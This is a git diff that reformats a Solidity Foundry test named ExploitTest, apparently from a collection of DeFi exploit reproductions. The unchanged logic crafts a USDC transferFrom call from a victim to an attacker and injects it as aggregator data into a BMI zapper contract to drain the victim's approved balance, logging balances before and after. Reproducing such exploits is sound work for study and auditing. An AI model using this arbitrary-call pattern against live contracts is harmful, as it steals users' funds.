@@ -45,11 +45,7 @@ contract ExploitTest is Test {
     }
 
     function testExploit() external {
-        emit log_named_decimal_uint(
-            "Victim's USDC balance before exploit",
-            USDC.balanceOf(victim),
-            USDC.decimals()
-        );
+        emit log_named_decimal_uint("Victim's USDC balance before exploit", USDC.balanceOf(victim), USDC.decimals());
 
         uint256 victimBalance = USDC.balanceOf(victim);
 
@@ -59,38 +55,26 @@ contract ExploitTest is Test {
 
         // Craft malicious data to call a transferFrom function in the USDC token contract
 
-        bytes memory maliciousCallData = abi.encodeWithSignature(
-            "transferFrom(address,address,uint256)",
-            victim,
-            attacker,
-            victimBalance
-        );
+        bytes memory maliciousCallData =
+            abi.encodeWithSignature("transferFrom(address,address,uint256)", victim, attacker, victimBalance);
 
         // Call zapToBMI with malicious aggregator data
 
         bmiZapper.zapToBMI(
             address(BUSD), // BUSD
             0, // _amount
-            address(0), // _fromUnderlying 
-            0, // _fromUnderlyingAmount 
+            address(0), // _fromUnderlying
+            0, // _fromUnderlyingAmount
             0, // _minBMIRecv
             bmiConstituents,
             bmiConstituentsWeightings,
             address(USDC), // _aggregator
             maliciousCallData, // _aggregatorData
-            true 
+            true
         );
 
-        emit log_named_decimal_uint(
-            "Victim's USDC balance after exploit",
-            USDC.balanceOf(victim),
-            USDC.decimals()
-        );
+        emit log_named_decimal_uint("Victim's USDC balance after exploit", USDC.balanceOf(victim), USDC.decimals());
 
-        emit log_named_decimal_uint(
-            "Attacker's USDC balance after exploit",
-            USDC.balanceOf(attacker),
-            USDC.decimals()
-        );
+        emit log_named_decimal_uint("Attacker's USDC balance after exploit", USDC.balanceOf(attacker), USDC.decimals());
     }
 }
